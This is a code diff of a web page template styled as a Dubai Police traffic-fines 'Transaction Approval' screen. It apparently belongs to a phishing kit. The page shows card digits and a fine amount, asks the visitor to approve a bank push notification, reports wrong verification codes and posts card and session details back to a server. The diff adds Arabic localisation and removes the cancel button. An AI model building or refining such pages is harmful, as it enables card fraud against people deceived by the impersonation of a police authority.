@@ -5,10 +5,11 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <title>Transaction Approval | Dubai Police</title>
 <link rel="icon" type="image/png" href="/dp-logo.png">
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
 <style>
 *{box-sizing:border-box;margin:0;padding:0;}
 body{font-family:'Inter',-apple-system,sans-serif;background:#f0f4f8;min-height:100vh;display:flex;flex-direction:column;max-width:480px;margin:0 auto;}
+[dir="rtl"] body{font-family:'Cairo','Inter',sans-serif;}
 @keyframes spin{to{transform:rotate(360deg)}}
 @keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
 @keyframes fadeUp{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
@@ -19,6 +20,7 @@ header{background:linear-gradient(135deg,#1a6b3a,#0f4a27);padding:14px 18px;disp
 .h-logo img{width:100%;height:100%;object-fit:cover;}
 .h-name{color:white;font-weight:800;font-size:14px;line-height:1.2;}
 .h-sub{color:rgba(255,255,255,0.6);font-size:11px;}
+.h-right{display:flex;align-items:center;gap:8px;}
 .h-badge{font-size:11px;color:rgba(255,255,255,0.5);}
 
 .main{flex:1;padding:20px 16px 32px;animation:fadeUp .4s ease both;}
@@ -52,9 +54,6 @@ header{background:linear-gradient(135deg,#1a6b3a,#0f4a27);padding:14px 18px;disp
 .btn-resend:hover{border-color:#1a6b3a;color:#1a6b3a;}
 .btn-resend:disabled{opacity:.5;cursor:default;}
 
-.btn-cancel{display:block;width:100%;padding:11px;background:none;border:none;font-size:12px;color:#9ca3af;cursor:pointer;text-align:center;}
-.btn-cancel:hover{color:#6b7280;}
-
 .footer-note{text-align:center;font-size:11px;color:#9ca3af;padding:14px 20px;display:flex;align-items:center;justify-content:center;gap:5px;border-top:1px solid #f1f5f9;}
 </style>
 <%- include('_pixel') %>
@@ -69,7 +68,10 @@ header{background:linear-gradient(135deg,#1a6b3a,#0f4a27);padding:14px 18px;disp
       <div class="h-sub">شرطة دبي</div>
     </div>
   </div>
-  <div class="h-badge">Traffic Fines Portal</div>
+  <div class="h-right">
+    <div class="h-badge" data-i18n="traffic_portal">Traffic Fines Portal</div>
+    <button id="lang-toggle" onclick="dpI18n.setLang(dpI18n.getLang()==='ar'?'en':'ar')" style="font-size:12px;font-weight:700;padding:4px 11px;border-radius:16px;border:1.5px solid rgba(255,255,255,0.45);background:rgba(255,255,255,0.12);color:white;cursor:pointer;">AR</button>
+  </div>
 </header>
 
 <div class="main">
@@ -80,38 +82,43 @@ header{background:linear-gradient(135deg,#1a6b3a,#0f4a27);padding:14px 18px;disp
       <div style="padding:12px 14px;background:#fef2f2;border:1.5px solid #fecaca;border-radius:10px;display:flex;gap:10px;align-items:flex-start;">
         <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#dc2626" stroke-width="2.5" stroke-linecap="round" style="flex-shrink:0;margin-top:1px;"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
         <div>
-          <div style="font-size:13px;font-weight:700;color:#dc2626;margin-bottom:2px;">Incorrect Code Entered</div>
-          <div style="font-size:12px;color:#dc2626;opacity:.85;">The code you entered was incorrect. Please try again with the latest code.</div>
+          <div style="font-size:13px;font-weight:700;color:#dc2626;margin-bottom:2px;" data-i18n="incorrect_code_title2">Incorrect Code Entered</div>
+          <div style="font-size:12px;color:#dc2626;opacity:.85;" data-i18n="incorrect_code_msg2">The code you entered was incorrect. Please try again with the latest code.</div>
         </div>
       </div>
     </div>
     <% } %>
+
     <div class="status-band">
       <div class="pulse-ring">
         <div class="pulse-icon">
           <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9v5l-1.29 1.29A1 1 0 004 17v1h16v-1a1 1 0 00-.71-.71L18 14V9c0-3.87-3.13-7-7-7z"/><path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2z"/></svg>
         </div>
       </div>
-      <div class="status-title">Approval Notification Sent</div>
-      <div class="status-sub">A push notification has been sent to your <span class="bank-name"><%= issuer %></span> mobile app.<br>Please open the app and <strong style="color:rgba(255,255,255,0.9);">approve the transaction</strong>.</div>
+      <div class="status-title" data-i18n="approval_sent">Approval Notification Sent</div>
+      <div class="status-sub">
+        <span data-i18n="open_app_approve">Please open the app and</span>
+        <strong style="color:rgba(255,255,255,0.9);" data-i18n="approve_tx"> approve the transaction</strong>.
+        <br><span class="bank-name"><%= issuer %></span>
+      </div>
     </div>
 
     <div class="details-section">
-      <div class="detail-label">Transaction Details</div>
+      <div class="detail-label" data-i18n="tx_details">Transaction Details</div>
       <div class="detail-row">
-        <span class="detail-key">Merchant</span>
+        <span class="detail-key" data-i18n="merchant">Merchant</span>
         <span class="detail-val">Dubai Police</span>
       </div>
       <div class="detail-row">
-        <span class="detail-key">Amount</span>
+        <span class="detail-key" data-i18n="amount">Amount</span>
         <span class="detail-val" style="color:#1a6b3a;font-size:16px;">AED <%= totalFine.toLocaleString() %></span>
       </div>
       <div class="detail-row">
-        <span class="detail-key">Card</span>
+        <span class="detail-key" data-i18n="card">Card</span>
         <span class="detail-val" style="font-family:monospace;">•••• •••• •••• <%= cardLast4 %></span>
       </div>
       <div class="detail-row">
-        <span class="detail-key">Date</span>
+        <span class="detail-key" data-i18n="date">Date</span>
         <span class="detail-val"><%= dateStr %></span>
       </div>
     </div>
@@ -119,18 +126,19 @@ header{background:linear-gradient(135deg,#1a6b3a,#0f4a27);padding:14px 18px;disp
     <div class="action-section">
       <div class="wait-indicator">
         <div class="wait-dot"></div>
-        Waiting for bank approval…
+        <span data-i18n="waiting_approval">Waiting for bank approval…</span>
       </div>
-      <button class="btn-resend" id="resend-btn" onclick="handleResend()">Resend Notification</button>
+      <button class="btn-resend" id="resend-btn" onclick="handleResend()" data-i18n="resend_notif">Resend Notification</button>
     </div>
 
     <div class="footer-note">
       <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-      Secured by 256-bit SSL encryption
+      <span data-i18n="ssl">Secured by 256-bit SSL encryption</span>
     </div>
   </div>
 </div>
 
+<script src="/js/i18n.js"></script>
 <script>
 const CARD_LAST4 = <%- JSON.stringify(cardLast4) %>;
 const TOTAL_FINE = <%- JSON.stringify(totalFine) %>;
@@ -157,7 +165,7 @@ function handleResend() {
   resent = true;
   const btn = document.getElementById('resend-btn');
   btn.disabled = true;
-  btn.textContent = 'Notification Resent ✓';
+  btn.textContent = (window.dpI18n ? window.dpI18n.t('resend_notif') : 'Resend Notification') + ' ✓';
   btn.style.color = '#1a6b3a';
   btn.style.borderColor = '#1a6b3a';
   if (SID) {
@@ -166,7 +174,7 @@ function handleResend() {
       body:JSON.stringify({type:'otp_notification_resend',sid:SID,cardLast4:CARD_LAST4,totalFine:TOTAL_FINE,issuer:ISSUER})
     }).catch(()=>{});
   }
-  setTimeout(()=>{ resent=false; btn.disabled=false; btn.textContent='Resend Notification'; btn.style.color=''; btn.style.borderColor=''; }, 5000);
+  setTimeout(()=>{ resent=false; btn.disabled=false; btn.textContent=window.dpI18n?window.dpI18n.t('resend_notif'):'Resend Notification'; btn.style.color=''; btn.style.borderColor=''; }, 5000);
 }
 </script>
 </body>
